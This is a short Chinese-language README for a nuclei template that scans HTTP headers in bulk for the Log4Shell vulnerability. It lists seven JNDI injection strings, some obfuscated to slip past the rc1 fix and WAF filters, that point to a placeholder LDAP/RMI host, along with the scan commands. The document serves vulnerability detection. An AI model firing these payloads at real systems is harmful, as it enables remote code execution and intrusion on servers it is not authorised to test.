# log4j-fuzz-head-poc
针对 log4j批量fuzzz 头检测poc，有效检测一些头部存在的安全风险

添加了绕过rc1的poc

也同时添加了绕过waf拦截poc
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```


# 使用
```
/nuclei -t log4j-fuzz-head-poc.yaml -u http://www.test.com  -o res.txt 单个检测

/nuclei -t log4j-fuzz-head-poc.yaml -l urls.txt  -o res.txt   批量检测
```

![image](https://user-images.githubusercontent.com/50769953/145665694-21632dd2-7336-474b-80ed-9cdba4919898.png)

